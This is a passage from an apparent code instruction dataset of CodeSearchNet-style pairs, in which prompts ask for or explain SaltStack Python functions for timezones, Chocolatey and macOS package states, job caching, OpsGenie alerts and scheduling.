the system timezone name."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_hwclock():\n    '''\n    Get current hardware clock setting (UTC or localtime)\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' timezone.get_hwclock\n    '''\n    if salt.utils.path.which('timedatectl'):\n        ret = _timedatectl()\n        for line in (x.strip() for x in ret['stdout'].splitlines()):\n            if 'rtc in local tz' in line.lower():\n                try:\n                    if line.split(':')[-1].strip().lower() == 'yes':\n                        return 'localtime'\n                    else:\n                        return 'UTC'\n                except IndexError:\n                    pass\n\n        msg = ('Failed to parse timedatectl output: {0}\\n'\n               'Please file an issue with SaltStack').format(ret['stdout'])\n        raise CommandExecutionError(msg)\n\n    else:\n        os_family = __grains__['os_family']\n        for family in ('RedHat', 'Suse', 'NILinuxRT'):\n            if family in os_family:\n                return _get_adjtime_timezone()\n\n        if 'Debian' in __grains__['os_family']:\n            # Original way to look up hwclock on Debian-based systems\n            try:\n                with salt.utils.files.fopen('/etc/default/rcS', 'r') as fp_:\n                    for line in fp_:\n                        line = salt.utils.stringutils.to_unicode(line)\n                        if re.match(r'^\\s*#', line):\n                            continue\n                        if 'UTC=' in line:\n                            is_utc = line.rstrip('\\n').split('=')[-1].lower()\n                            if is_utc == 'yes':\n                                return 'UTC'\n                            else:\n                                return 'localtime'\n            except IOError as exc:\n                pass\n            # Since Wheezy\n            return _get_adjtime_timezone()\n\n        if 'Gentoo' in __grains__['os_family']:\n            if not os.path.exists('/etc/adjtime'):\n                offset_file = '/etc/conf.d/hwclock'\n                try:\n                    with salt.utils.files.fopen(offset_file, 'r') as fp_:\n                        for line in fp_:\n                            line = salt.utils.stringutils.to_unicode(line)\n                            if line.startswith('clock='):\n                                line = line.rstrip('\\n')\n                                line = line.split('=')[-1].strip('\\'\"')\n                                if line == 'UTC':\n                                    return line\n                                if line == 'local':\n                                    return 'LOCAL'\n                        raise CommandExecutionError(\n                            'Correct offset value not found in {0}'\n                            .format(offset_file)\n                        )\n                except IOError as exc:\n                    raise CommandExecutionError(\n                        'Problem reading offset file {0}: {1}'\n                        .format(offset_file, exc.strerror)\n                    )\n            return _get_adjtime_timezone()\n\n        if 'Solaris' in __grains__['os_family']:\n            offset_file = '/etc/rtc_config'\n            try:\n                with salt.utils.files.fopen(offset_file, 'r') as fp_:\n                    for line in fp_:\n                        line = salt.utils.stringutils.to_unicode(line)\n                        if line.startswith('zone_info=GMT'):\n                            return 'UTC'\n                    return 'localtime'\n            except IOError as exc:\n                if exc.errno == errno.ENOENT:\n                    # offset file does not exist\n                    return 'UTC'\n                raise CommandExecutionError(\n                    'Problem reading offset file {0}: {1}'\n                    .format(offset_file, exc.strerror)\n                )\n\n        if 'AIX' in __grains__['os_family']:\n            offset_file = '/etc/environment'\n            try:\n                with salt.utils.files.fopen(offset_file, 'r') as fp_:\n                    for line in fp_:\n                        line = salt.utils.stringutils.to_unicode(line)\n                        if line.startswith('TZ=UTC'):\n                            return 'UTC'\n                    return 'localtime'\n            except IOError as exc:\n                if exc.errno == errno.ENOENT:\n                    # offset file does not exist\n                    return 'UTC'\n                raise CommandExecutionError(\n                    'Problem reading offset file {0}: {1}'\n                    .format(offset_file, exc.strerror)\n                )", "response": "Return the current hardware clock setting"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nset the hardware clock for the current system to either UTC or localtime", "response": "def set_hwclock(clock):\n    '''\n    Sets the hardware clock to be either UTC or localtime\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' timezone.set_hwclock UTC\n    '''\n    if salt.utils.path.which('timedatectl'):\n        cmd = ['timedatectl', 'set-local-rtc',\n               'true' if clock == 'localtime' else 'false']\n        return __salt__['cmd.retcode'](cmd, python_shell=False) == 0\n    else:\n        os_family = __grains__['os_family']\n        if os_family in ('AIX', 'NILinuxRT'):\n            if clock.lower() != 'utc':\n                raise SaltInvocationError(\n                    'UTC is the only permitted value'\n                )\n            return True\n\n        timezone = get_zone()\n\n        if 'Solaris' in __grains__['os_family']:\n            if clock.lower() not in ('localtime', 'utc'):\n                raise SaltInvocationError(\n                    'localtime and UTC are the only permitted values'\n                )\n            if 'sparc' in __grains__['cpuarch']:\n                raise SaltInvocationError(\n                    'UTC is the only choice for SPARC architecture'\n                )\n            cmd = ['rtc', '-z', 'GMT' if clock.lower() == 'utc' else timezone]\n            return __salt__['cmd.retcode'](cmd, python_shell=False) == 0\n\n        zonepath = '/usr/share/zoneinfo/{0}'.format(timezone)\n\n        if not os.path.exists(zonepath):\n            raise CommandExecutionError(\n                'Zone \\'{0}\\' does not exist'.format(zonepath)\n            )\n\n        os.unlink('/etc/localtime')\n        os.symlink(zonepath, '/etc/localtime')\n\n        if 'Arch' in __grains__['os_family']:\n            cmd = ['timezonectl', 'set-local-rtc',\n                   'true' if clock == 'localtime' else 'false']\n            return __salt__['cmd.retcode'](cmd, python_shell=False) == 0\n        elif 'RedHat' in __grains__['os_family']:\n            __salt__['file.sed'](\n                '/etc/sysconfig/clock', '^ZONE=.*', 'ZONE=\"{0}\"'.format(timezone))\n        elif 'Suse' in __grains__['os_family']:\n            __salt__['file.sed'](\n                '/etc/sysconfig/clock', '^TIMEZONE=.*', 'TIMEZONE=\"{0}\"'.format(timezone))\n        elif 'Debian' in __grains__['os_family']:\n            if clock == 'UTC':\n                __salt__['file.sed']('/etc/default/rcS', '^UTC=.*', 'UTC=yes')\n            elif clock == 'localtime':\n                __salt__['file.sed']('/etc/default/rcS', '^UTC=.*', 'UTC=no')\n        elif 'Gentoo' in __grains__['os_family']:\n            if clock not in ('UTC', 'localtime'):\n                raise SaltInvocationError(\n                    'Only \\'UTC\\' and \\'localtime\\' are allowed'\n                )\n            if clock == 'localtime':\n                clock = 'local'\n            __salt__['file.sed'](\n                '/etc/conf.d/hwclock', '^clock=.*', 'clock=\"{0}\"'.format(clock))\n\n    return True"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn a new Chocolatey package if it is already installed.", "response": "def installed(name, version=None, source=None, force=False, pre_versions=False,\n              install_args=None, override_args=False, force_x86=False,\n              package_args=None, allow_multiple=False, execution_timeout=None):\n    '''\n    Installs a package if not already installed\n\n    Args:\n\n        name (str):\n            The name of the package to be installed. Required.\n\n        version (str):\n            Install a specific version of the package. Defaults to latest\n            version. If the version is different to the one installed then the\n            specified version will be installed. Default is None.\n\n        source (str):\n            Chocolatey repository (directory, share or remote URL, feed).\n            Defaults to the official Chocolatey feed. Default is None.\n\n        force (bool):\n            Reinstall the current version of an existing package. Do not use\n            with ``allow_multiple``. Default is False.\n\n        pre_versions (bool):\n            Include pre-release packages. Default is False.\n\n        install_args (str):\n            Install arguments you want to pass to the installation process, i.e\n            product key or feature list. Default is None.\n\n        override_args (bool):\n            Set to True if you want to override the original install arguments\n            (for the native installer) in the package and use your own. When\n            this is set to False install_args will be appended to the end of the\n            default arguments. Default is False.\n\n        force_x86 (bool):\n            Force x86 (32bit) installation on 64 bit systems. Default is False.\n\n        package_args (str):\n            Arguments you want to pass to the package. Default is None.\n\n        allow_multiple (bool):\n            Allow mulitiple versions of the package to be installed. Do not use\n            with ``force``. Does not work with all packages. Default is False.\n\n            .. versionadded:: 2017.7.0\n\n        execution_timeout (str):\n            Chocolatey execution timeout value you want to pass to the\n            installation process. Default is None.\n\n    .. code-block:: yaml\n\n        Installsomepackage:\n          chocolatey.installed:\n            - name: packagename\n            - version: '12.04'\n            - source: 'mychocolatey/source'\n            - force: True\n    '''\n    if force and allow_multiple:\n        raise SaltInvocationError(\n            'Cannot use \\'force\\' in conjunction with \\'allow_multiple\\'')\n\n    ret = {'name': name,\n           'result': True,\n           'changes': {},\n           'comment': ''}\n\n    # Get list of currently installed packages\n    pre_install = __salt__['chocolatey.list'](local_only=True)\n\n    # Determine action\n    # Package not installed\n    if name.lower() not in [package.lower() for package in pre_install.keys()]:\n        if version:\n            ret['changes'] = {name: 'Version {0} will be installed'.format(version)}\n        else:\n            ret['changes'] = {name: 'Latest version will be installed'}\n\n    # Package installed\n    else:\n        version_info = __salt__['chocolatey.version'](name=name,\n                                                      check_remote=True,\n                                                      source=source)\n\n        full_name = name\n        for pkg in version_info:\n            if name.lower() == pkg.lower():\n                full_name = pkg\n\n        installed_version = version_info[full_name]['installed'][0]\n\n        if version:\n            if salt.utils.versions.compare(\n                    ver1=installed_version, oper=\"==\", ver2=version):\n                if force:\n                    ret['changes'] = {\n                        name: 'Version {0} will be reinstalled'.format(version)}\n                    ret['comment'] = 'Reinstall {0} {1}'.format(full_name, version)\n                else:\n                    ret['comment'] = '{0} {1} is already installed'.format(name, version)\n                    if __opts__['test']:\n                        ret['result'] = None\n                    return ret\n            else:\n                if allow_multiple:\n                    ret['changes'] = {\n                        name: 'Version {0} will be installed side by side with '\n                              'Version {1} if supported'.format(version, installed_version)\n                    }\n                    ret['comment'] = (\n                        'Install {0} {1} side-by-side with {0} {2}'.format(\n                            full_name, version, installed_version\n                        )\n                    )\n                else:\n                    ret['changes'] = {\n                        name: 'Version {0} will be installed over Version {1}'.format(version, installed_version)\n                    }\n                    ret['comment'] = 'Install {0} {1} over {0} {2}'.format(\n                        full_name, version, installed_version\n                    )\n                    force = True\n        else:\n            version = installed_version\n            if force:\n                ret['changes'] = {\n                    name: 'Version {0} will be reinstalled'.format(version)}\n                ret['comment'] = 'Reinstall {0} {1}'.format(full_name, version)\n            else:\n                ret['comment'] = '{0} {1} is already installed'.format(name, version)\n                if __opts__['test']:\n                    ret['result'] = None\n                return ret\n\n    if __opts__['test']:\n        ret['result'] = None\n        ret['comment'] = 'The installation was tested'\n        return ret\n\n    # Install the package\n    result = __salt__['chocolatey.install'](name=name,\n                                            version=version,\n                                            source=source,\n                                            force=force,\n                                            pre_versions=pre_versions,\n                                            install_args=install_args,\n                                            override_args=override_args,\n                                            force_x86=force_x86,\n                                            package_args=package_args,\n                                            allow_multiple=allow_multiple,\n                                            execution_timeout=execution_timeout)\n\n    if 'Running chocolatey failed' not in result:\n        ret['result'] = True\n    else:\n        ret['result'] = False\n\n    if not ret['result']:\n        ret['comment'] = 'Failed to install the package {0}'.format(name)\n\n    # Get list of installed packages after 'chocolatey.install'\n    post_install = __salt__['chocolatey.list'](local_only=True)\n\n    ret['changes'] = salt.utils.data.compare_dicts(pre_install, post_install)\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef uninstalled(name, version=None, uninstall_args=None, override_args=False):\n    '''\n    Uninstalls a package\n\n    name\n      The name of the package to be uninstalled\n\n    version\n      Uninstalls a specific version of the package. Defaults to latest\n      version installed.\n\n    uninstall_args\n      A list of uninstall arguments you want to pass to the uninstallation\n      process i.e product key or feature list\n\n    override_args\n      Set to true if you want to override the original uninstall arguments (\n      for the native uninstaller)in the package and use your own.\n      When this is set to False uninstall_args will be appended to the end of\n      the default arguments\n\n    .. code-block: yaml\n\n      Removemypackage:\n        chocolatey.uninstalled:\n          - name: mypackage\n          - version: '21.5'\n\n    '''\n\n    ret = {'name': name,\n           'result': True,\n           'changes': {},\n           'comment': ''}\n\n    # Get list of currently installed packages\n    pre_uninstall = __salt__['chocolatey.list'](local_only=True)\n\n    # Determine if package is installed\n    if name.lower() in [package.lower() for package in pre_uninstall.keys()]:\n        try:\n            ret['changes'] = {\n                name: '{0} version {1} will be removed'.format(\n                    name, pre_uninstall[name][0]\n                )\n            }\n        except KeyError:\n            ret['changes'] = {name: '{0} will be removed'.format(name)}\n    else:\n        ret['comment'] = 'The package {0} is not installed'.format(name)\n        return ret\n\n    if __opts__['test']:\n        ret['result'] = None\n        ret['comment'] = 'The uninstall was tested'\n        return ret\n\n    # Uninstall the package\n    result = __salt__['chocolatey.uninstall'](name,\n                                              version,\n                                              uninstall_args,\n                                              override_args)\n\n    if 'Running chocolatey failed' not in result:\n        ret['result'] = True\n    else:\n        ret['result'] = False\n\n    if not ret['result']:\n        ret['comment'] = 'Failed to uninstall the package {0}'.format(name)\n\n    # Get list of installed packages after 'chocolatey.uninstall'\n    post_uninstall = __salt__['chocolatey.list'](local_only=True)\n\n    ret['changes'] = salt.utils.data.compare_dicts(pre_uninstall, post_uninstall)\n\n    return ret", "response": "Uninstalls a package from the chocolatey system"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nstore the job information using the configured master_job_cache", "response": "def store_job(opts, load, event=None, mminion=None):\n    '''\n    Store job information using the configured master_job_cache\n    '''\n    # Generate EndTime\n    endtime = salt.utils.jid.jid_to_time(salt.utils.jid.gen_jid(opts))\n    # If the return data is invalid, just ignore it\n    if any(key not in load for key in ('return', 'jid', 'id')):\n        return False\n    if not salt.utils.verify.valid_id(opts, load['id']):\n        return False\n    if mminion is None:\n        mminion = salt.minion.MasterMinion(opts, states=False, rend=False)\n\n    job_cache = opts['master_job_cache']\n    if load['jid'] == 'req':\n        # The minion is returning a standalone job, request a jobid\n        load['arg'] = load.get('arg', load.get('fun_args', []))\n        load['tgt_type'] = 'glob'\n        load['tgt'] = load['id']\n\n        prep_fstr = '{0}.prep_jid'.format(opts['master_job_cache'])\n        try:\n            load['jid'] = mminion.returners[prep_fstr](nocache=load.get('nocache', False))\n        except KeyError:\n            emsg = \"Returner '{0}' does not support function prep_jid\".format(job_cache)\n            log.error(emsg)\n            raise KeyError(emsg)\n\n        # save the load, since we don't have it\n        saveload_fstr = '{0}.save_load'.format(job_cache)\n        try:\n            mminion.returners[saveload_fstr](load['jid'], load)\n        except KeyError:\n            emsg = \"Returner '{0}' does not support function save_load\".format(job_cache)\n            log.error(emsg)\n            raise KeyError(emsg)\n    elif salt.utils.jid.is_jid(load['jid']):\n        # Store the jid\n        jidstore_fstr = '{0}.prep_jid'.format(job_cache)\n        try:\n            mminion.returners[jidstore_fstr](False, passed_jid=load['jid'])\n        except KeyError:\n            emsg = \"Returner '{0}' does not support function prep_jid\".format(job_cache)\n            log.error(emsg)\n            raise KeyError(emsg)\n\n    if event:\n        # If the return data is invalid, just ignore it\n        log.info('Got return from %s for job %s', load['id'], load['jid'])\n        event.fire_event(load,\n                         salt.utils.event.tagify([load['jid'], 'ret', load['id']], 'job'))\n        event.fire_ret_load(load)\n\n    # if you have a job_cache, or an ext_job_cache, don't write to\n    # the regular master cache\n    if not opts['job_cache'] or opts.get('ext_job_cache'):\n        return\n\n    # do not cache job results if explicitly requested\n    if load.get('jid') == 'nocache':\n        log.debug('Ignoring job return with jid for caching %s from %s',\n                  load['jid'], load['id'])\n        return\n\n    # otherwise, write to the master cache\n    savefstr = '{0}.save_load'.format(job_cache)\n    getfstr = '{0}.get_load'.format(job_cache)\n    fstr = '{0}.returner'.format(job_cache)\n    updateetfstr = '{0}.update_endtime'.format(job_cache)\n    if 'fun' not in load and load.get('return', {}):\n        ret_ = load.get('return', {})\n        if 'fun' in ret_:\n            load.update({'fun': ret_['fun']})\n        if 'user' in ret_:\n            load.update({'user': ret_['user']})\n\n    # Try to reach returner methods\n    try:\n        savefstr_func = mminion.returners[savefstr]\n        getfstr_func = mminion.returners[getfstr]\n        fstr_func = mminion.returners[fstr]\n    except KeyError as error:\n        emsg = \"Returner '{0}' does not support function {1}\".format(job_cache, error)\n        log.error(emsg)\n        raise KeyError(emsg)\n\n    if job_cache != 'local_cache':\n        try:\n            mminion.returners[savefstr](load['jid'], load)\n        except KeyError as e:\n            log.error(\"Load does not contain 'jid': %s\", e)\n\n    mminion.returners[fstr](load)\n\n    if (opts.get('job_cache_store_endtime')\n            and updateetfstr in mminion.returners):\n        mminion.returners[updateetfstr](load['jid'], endtime)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nstoring additional minions matched on lower - level masters using the configured master_job_cache", "response": "def store_minions(opts, jid, minions, mminion=None, syndic_id=None):\n    '''\n    Store additional minions matched on lower-level masters using the configured\n    master_job_cache\n    '''\n    if mminion is None:\n        mminion = salt.minion.MasterMinion(opts, states=False, rend=False)\n    job_cache = opts['master_job_cache']\n    minions_fstr = '{0}.save_minions'.format(job_cache)\n\n    try:\n        mminion.returners[minions_fstr](jid, minions, syndic_id=syndic_id)\n    except KeyError:\n        raise KeyError(\n            'Returner \\'{0}\\' does not support function save_minions'.format(\n                job_cache\n            )\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ndetermines a retcode for a given return value", "response": "def get_retcode(ret):\n    '''\n    Determine a retcode for a given return\n    '''\n    retcode = 0\n    # if there is a dict with retcode, use that\n    if isinstance(ret, dict) and ret.get('retcode', 0) != 0:\n        return ret['retcode']\n    # if its a boolean, False means 1\n    elif isinstance(ret, bool) and not ret:\n        return 1\n    return retcode"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef beacon(config):\n    '''\n    Checks for locked accounts due to too many invalid login attempts, 3 or higher.\n\n    .. code-block:: yaml\n\n        beacons:\n          aix_account:\n            user: ALL\n            interval: 120\n\n    '''\n\n    ret = []\n\n    user = config['user']\n\n    locked_accounts = __salt__['shadow.login_failures'](user)\n    ret.append({'accounts': locked_accounts})\n\n    return ret", "response": "Check for locked accounts due to too many invalid login attempts 3 or higher."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\npost data to OpsGenie. It's designed for Salt's Event Reactor. After configuring the sls reaction file as shown above, you can trigger the module with your designated tag (og-tag in this case). CLI Example: .. code-block:: bash salt-call event.send 'og-tag' '{\"reason\" : \"Overheating CPU!\"}' Required parameters: api_key It's the API Key you've copied while adding integration in OpsGenie. reason It will be used as alert's default message in OpsGenie. action_type OpsGenie supports the default values Create/Close for action_type. You can customize this field with OpsGenie's custom actions for other purposes like adding notes or acknowledging alerts. Optional parameters: name It will be used as alert's alias. If you want to use the close functionality you must provide name field for both states like in this case.", "response": "def post_data(api_key=None, name='OpsGenie Execution Module', reason=None,\n              action_type=None):\n    '''\n    Post data to OpsGenie. It's designed for Salt's Event Reactor.\n\n    After configuring the sls reaction file as shown above, you can trigger the\n    module with your designated tag (og-tag in this case).\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt-call event.send 'og-tag' '{\"reason\" : \"Overheating CPU!\"}'\n\n    Required parameters:\n\n    api_key\n        It's the API Key you've copied while adding integration in OpsGenie.\n\n    reason\n        It will be used as alert's default message in OpsGenie.\n\n    action_type\n        OpsGenie supports the default values Create/Close for action_type. You\n        can customize this field with OpsGenie's custom actions for other\n        purposes like adding notes or acknowledging alerts.\n\n    Optional parameters:\n\n    name\n        It will be used as alert's alias. If you want to use the close\n        functionality you must provide name field for both states like in\n        this case.\n    '''\n    if api_key is None or reason is None:\n        raise salt.exceptions.SaltInvocationError(\n            'API Key or Reason cannot be None.')\n\n    data = dict()\n    data['alias'] = name\n    data['message'] = reason\n    # data['actions'] = action_type\n    data['cpuModel'] = __grains__['cpu_model']\n    data['cpuArch'] = __grains__['cpuarch']\n    data['fqdn'] = __grains__['fqdn']\n    data['host'] = __grains__['host']\n    data['id'] = __grains__['id']\n    data['kernel'] = __grains__['kernel']\n    data['kernelRelease'] = __grains__['kernelrelease']\n    data['master'] = __grains__['master']\n    data['os'] = __grains__['os']\n    data['saltPath'] = __grains__['saltpath']\n    data['saltVersion'] = __grains__['saltversion']\n    data['username'] = __grains__['username']\n    data['uuid'] = __grains__['uuid']\n\n    log.debug('Below data will be posted:\\n%s', data)\n    log.debug('API Key: %s \\t API Endpoint: %s', api_key, API_ENDPOINT)\n\n    if action_type == \"Create\":\n        response = requests.post(\n            url=API_ENDPOINT,\n            data=salt.utils.json.dumps(data),\n            headers={'Content-Type': 'application/json',\n                 'Authorization': 'GenieKey ' + api_key})\n    else:\n        response = requests.post(\n            url=API_ENDPOINT + \"/\" + name + \"/close?identifierType=alias\",\n            data=salt.utils.json.dumps(data),\n            headers={'Content-Type': 'application/json',\n                     'Authorization': 'GenieKey ' + api_key})\n\n    return response.status_code, response.text"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ninstalling a Mac OS Package from a pkg or dmg file.", "response": "def installed(name, target=\"LocalSystem\", dmg=False, store=False, app=False, mpkg=False, user=None, onlyif=None,\n              unless=None, force=False, allow_untrusted=False, version_check=None):\n    '''\n    Install a Mac OS Package from a pkg or dmg file, if given a dmg file it\n    will first be mounted in a temporary location\n\n    name\n        The pkg or dmg file to install\n\n    target\n        The location in which to install the package. This can be a path or LocalSystem\n\n    dmg\n        Is the given file a dmg file?\n\n    store\n        Should the pkg be installed as if it was from the Mac OS Store?\n\n    app\n        Is the file a .app? If so then we'll just copy that to /Applications/ or the given\n        target\n\n    mpkg\n        Is the file a .mpkg? If so then we'll check all of the .pkg files found are installed\n\n    user\n        Name of the user performing the unless or onlyif checks\n\n    onlyif\n        A command to run as a check, run the named command only if the command\n        passed to the ``onlyif`` option returns true\n\n    unless\n        A command to run as a check, only run the named command if the command\n        passed to the ``unless`` option returns false\n\n    force\n        Force the package to be installed even if its already been found installed\n\n    allow_untrusted\n        Allow the installation of untrusted packages\n\n    version_check\n        The command and version that we want to check against, the version number can use regex.\n\n        .. code-block:: yaml\n\n            version_check: python --version_check=2.7.[0-9]\n\n    '''\n    ret = {'name': name,\n           'result': True,\n           'comment': '',\n           'changes': {}}\n    found = []\n    installing = []\n\n    real_pkg = name\n\n    # Check onlyif, unless first\n    run_check_cmd_kwargs = {'runas': user, 'python_shell': True}\n    if 'shell' in __grains__:\n        run_check_cmd_kwargs['shell'] = __grains__['shell']\n\n    cret = _mod_run_check(run_check_cmd_kwargs, onlyif, unless)\n\n    if isinstance(cret, dict):\n        ret.update(cret)\n        return ret\n\n    # Check version info\n    if version_check is not None:\n        split = version_check.split(\"=\")\n        if len(split) == 2:\n            version_cmd = split[0]\n            expected_version = split[1]\n            try:\n                version_out = __salt__['cmd.run'](version_cmd, output_loglevel=\"quiet\", ignore_retcode=True)\n                version_out = version_out.strip()\n            except CommandExecutionError:\n                version_out = \"\"\n\n            if re.match(expected_version, version_out) is not None:\n                ret['comment'] += \"Version already matches {0}\".format(expected_version)\n                return ret\n            else:\n                ret['comment'] += \"Version {0} doesn't match {1}. \".format(version_out, expected_version)\n\n    if app and target == \"LocalSystem\":\n        target = \"/Applications/\"\n\n    # Mount the dmg first\n    mount_point = None\n    if dmg:\n        out, mount_point = __salt__['macpackage.mount'](name)\n        if 'attach failed' in out:\n            ret['result'] = False\n            ret['comment'] += 'Unable to mount {0}'.format(name)\n            return ret\n\n        if app:\n            real_pkg = mount_point + \"/*.app\"\n        elif mpkg:\n            real_pkg = mount_point + \"/*.mpkg\"\n        else:\n            real_pkg = mount_point + \"/*.pkg\"\n\n    try:\n        # Check if we have already installed this\n        if app:\n            if dmg:\n                # Run with python shell due to the wildcard\n                cmd = 'ls -d *.app'\n                out = __salt__['cmd.run'](cmd, cwd=mount_point, python_shell=True)\n\n                if '.app' not in out:\n                    ret['result'] = False\n                    ret['comment'] += 'Unable to find .app in {0}'.format(mount_point)\n                    return ret\n                else:\n                    pkg_ids = out.split(\"\\n\")\n            else:\n                pkg_ids = [os.path.basename(name)]\n                mount_point = os.path.dirname(name)\n\n            if onlyif is None and unless is None and version_check is None:\n                for p in pkg_ids:\n                    if target[-4:] == \".app\":\n                        install_dir = target\n                    else:\n                        install_dir = os.path.join(target, p)\n                    if os.path.exists(install_dir) and force is False:\n                        found.append(p)\n                    else:\n                        installing.append(p)\n            else:\n                installing = pkg_ids\n        else:\n            installed_pkgs = __salt__['macpackage.installed_pkgs']()\n\n            if mpkg:\n                pkg_ids = __salt__['macpackage.get_mpkg_ids'](real_pkg)\n            else:\n                pkg_ids = __salt__['macpackage.get_pkg_id'](real_pkg)\n\n            if pkg_ids:\n                for p in pkg_ids:\n                    if p in installed_pkgs and force is False:\n                        found.append(p)\n                    else:\n                        installing.append(p)\n                if len(pkg_ids) == len(found):\n                    return ret\n\n        if app:\n            def failed_pkg(f_pkg):\n                ret['result'] = False\n                ret['comment'] += '{0} failed to install: {1}'.format(name, out)\n\n                if 'failed' in ret['changes']:\n                    ret['changes']['failed'].append(f_pkg)\n                else:\n                    ret['changes']['failed'] = [f_pkg]\n\n            for app in installing:\n                try:\n                    log.info('Copying %s to %s', app, target)\n\n                    out = __salt__['macpackage.install_app'](os.path.join(mount_point, app), target)\n\n                    if out:\n                        failed_pkg(app)\n                    else:\n                        ret['comment'] += '{0} installed'.format(app)\n                        if 'installed' in ret['changes']:\n                            ret['changes']['installed'].append(app)\n                        else:\n                            ret['changes']['installed'] = [app]\n\n                except OSError:\n                    failed_pkg(app)\n        else:\n            out = __salt__['macpackage.install'](real_pkg, target, store, allow_untrusted)\n\n            if out['retcode'] != 0:\n                ret['result'] = False\n                ret['comment'] += '. {0} failed to install: {1}'.format(name, out)\n            else:\n                ret['comment'] += '{0} installed'.format(name)\n                ret['changes']['installed'] = installing\n\n    finally:\n        if dmg:\n            # Unmount to be kind\n            __salt__['macpackage.unmount'](mount_point)\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _mod_run_check(cmd_kwargs, onlyif, unless):\n    '''\n    Execute the onlyif and unless logic.\n    Return a result dict if:\n    * onlyif failed (onlyif != 0)\n    * unless succeeded (unless == 0)\n    else return True\n    '''\n    if onlyif:\n        if __salt__['cmd.retcode'](onlyif, **cmd_kwargs) != 0:\n            return {'comment': 'onlyif condition is false',\n                    'skip_watch': True,\n                    'result': True}\n\n    if unless:\n        if __salt__['cmd.retcode'](unless, **cmd_kwargs) == 0:\n            return {'comment': 'unless condition is true',\n                    'skip_watch': True,\n                    'result': True}\n\n    # No reason to stop, return True\n    return True", "response": "Execute the onlyif and unless logic."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns the status of a service via rest_sample. service_status", "response": "def status(name, sig=None):\n    '''\n    Return the status for a service via rest_sample.\n    If the name contains globbing, a dict mapping service name to True/False\n    values is returned.\n\n    .. versionadded:: 2015.8.0\n\n    .. versionchanged:: 2018.3.0\n        The service name can now be a glob (e.g. ``salt*``)\n\n    Args:\n        name (str): The name of the service to check\n        sig (str): Not implemented\n\n    Returns:\n        bool: True if running, False otherwise\n        dict: Maps service name to True if running, False otherwise\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' service.status <service name>\n    '''\n\n    proxy_fn = 'rest_sample.service_status'\n    contains_globbing = bool(re.search(r'\\*|\\?|\\[.+\\]', name))\n    if contains_globbing:\n        services = fnmatch.filter(get_all(), name)\n    else:\n        services = [name]\n    results = {}\n    for service in services:\n        resp = __proxy__[proxy_fn](service)\n        if resp['comment'] == 'running':\n            results[service] = True\n        else:\n            results[service] = False\n    if contains_globbing:\n        return results\n    return results[name]"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef clean_proc_dir(opts):\n\n    '''\n    Loop through jid files in the minion proc directory (default /var/cache/salt/minion/proc)\n    and remove any that refer to processes that no longer exist\n    '''\n\n    for basefilename in os.listdir(salt.minion.get_proc_dir(opts['cachedir'])):\n        fn_ = os.path.join(salt.minion.get_proc_dir(opts['cachedir']), basefilename)\n        with salt.utils.files.fopen(fn_, 'rb') as fp_:\n            job = None\n            try:\n                job = salt.payload.Serial(opts).load(fp_)\n            except Exception:  # It's corrupted\n                # Windows cannot delete an open file\n                if salt.utils.platform.is_windows():\n                    fp_.close()\n                try:\n                    os.unlink(fn_)\n                    continue\n                except OSError:\n                    continue\n            log.debug(\n                'schedule.clean_proc_dir: checking job %s for process '\n                'existence', job\n            )\n            if job is not None and 'pid' in job:\n                if salt.utils.process.os_is_running(job['pid']):\n                    log.debug(\n                        'schedule.clean_proc_dir: Cleaning proc dir, pid %s '\n                        'still exists.', job['pid']\n                    )\n                else:\n                    # Windows cannot delete an open file\n                    if salt.utils.platform.is_windows():\n                        fp_.close()\n                    # Maybe the file is already gone\n                    try:\n                        os.unlink(fn_)\n                    except OSError:\n                        pass", "response": "Clean the proc directory and remove any processes that no longer exist."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef option(self, opt):\n        '''\n        Return options merged from config and pillar\n        '''\n        if 'config.merge' in self.functions:\n            return self.functions['config.merge'](opt, {}, omit_master=True)\n        return self.opts.get(opt, {})", "response": "Return options merged from config and pillar\n       "}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn the schedule data structure", "response": "def _get_schedule(self,\n                      include_opts=True,\n                      include_pillar=True,\n                      remove_hidden=False):\n        '''\n        Return the schedule data structure\n        '''\n        schedule = {}\n        if include_pillar:\n            pillar_schedule = self.opts.get('pillar', {}).get('schedule', {})\n            if not isinstance(pillar_schedule, dict):\n                raise ValueError('Schedule must be of type dict.')\n            schedule.update(pillar_schedule)\n        if include_opts:\n            opts_schedule = self.opts.get('schedule', {})\n            if not isinstance(opts_schedule, dict):\n                raise ValueError('Schedule must be of type dict.')\n            schedule.update(opts_schedule)\n\n        if remove_hidden:\n            _schedule = copy.deepcopy(schedule)\n            for job in _schedule:\n                if isinstance(_schedule[job], dict):\n                    for item in _schedule[job]:\n                        if item.startswith('_'):\n                            del schedule[job][item]\n        return schedule"}
